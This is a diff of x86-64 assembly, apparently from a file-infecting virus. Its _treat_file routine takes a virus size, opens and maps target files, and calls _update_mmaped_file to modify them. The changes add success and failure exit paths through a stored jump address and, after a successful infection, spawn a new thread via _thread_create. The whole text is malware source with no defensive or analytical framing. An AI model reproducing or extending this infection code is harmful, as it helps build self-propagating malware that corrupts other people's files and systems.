@@ -4,6 +4,7 @@ section .text
 	extern _update_mmaped_file
 	extern _string
 	extern _ft_strlen
+	extern _thread_create
 
 _file_size:
 	enter 24, 0
@@ -26,7 +27,7 @@ _file_size:
 	ret
 
 _treat_file: ; void treat_file(char *name (rdi), long virus_size (rsi), char *full_path (rdx))
-	enter 120, 0 ; equal to push rbp - mov rbp, rsp - sub rsp, 16
+	enter 128, 0 ; equal to push rbp - mov rbp, rsp - sub rsp, 16
 				; rsp + 0 bytes for fd
 				; rsp + 8 bytes for virus size
 				; rsp + 16 bytes for file size
@@ -40,9 +41,10 @@ _treat_file: ; void treat_file(char *name (rdi), long virus_size (rsi), char *fu
 				; rsp + 80 name len
 				; rsp + 88 full_path len
 				; rsp + 96 total len
+				; rsp + 104 end jmp addr
 ; check if name != NULL
 	cmp rdi, 0
-	je _final_end
+	je _not_ok_end
 ; save virus_size
 	mov QWORD [rsp + 8], rsi
 	mov QWORD [rsp + 64], rdi
@@ -102,11 +104,19 @@ _lab_test:
 	syscall
 	add rsp, QWORD [rsp]
 	cmp rax, -1
-	jle _final_end
+	jle _not_ok_end
 	mov QWORD [rsp], rax ; store the fd
 	mov rdi, rax
+	mov r10, QWORD [rsp + 96]
+	sub rsp, r10
+	sub rsp, 8
+	mov QWORD [rsp], r10
+	add QWORD [rsp], 8
 	call _file_size
+	add rsp, QWORD [rsp]
 	mov QWORD [rsp + 16], rax ; store file size
+	lea r10, [rel _not_ok_end]
+	mov QWORD [rsp + 104], r10
 	cmp rax, 64
 	jl _close_file
 	
@@ -235,6 +245,8 @@ _call_mmaped_update:
 	add QWORD [rsp], 8
 	call _update_mmaped_file
 	add rsp, QWORD [rsp]
+	lea rax, [rel _ok_end]
+	mov QWORD [rsp + 104], rax
 
 ;;;;;;;;;;;;;;;;;;;;;;;;
 ; munmap
@@ -249,6 +261,26 @@ _close_file:
 	mov rax, 3
 	mov rdi, QWORD [rsp]
 	syscall
+	mov rax, QWORD [rsp + 104]
+	jmp rax
+
+_ok_end:
+	mov r10, QWORD [rsp + 96]
+	mov rdi, QWORD [rsp + 64]
+	mov rsi, QWORD [rsp + 72]
+	mov rdx, rsp
+	sub rdx, r10
+	sub rsp, r10
+	sub rsp, 8
+	mov QWORD [rsp], r10
+	add QWORD [rsp], 8
+	call _thread_create
+	add rsp, QWORD [rsp]
+	mov rax, 1
+	jmp _final_end
+
+_not_ok_end:
+	mov rax, 0
 
 _final_end:
 	leave
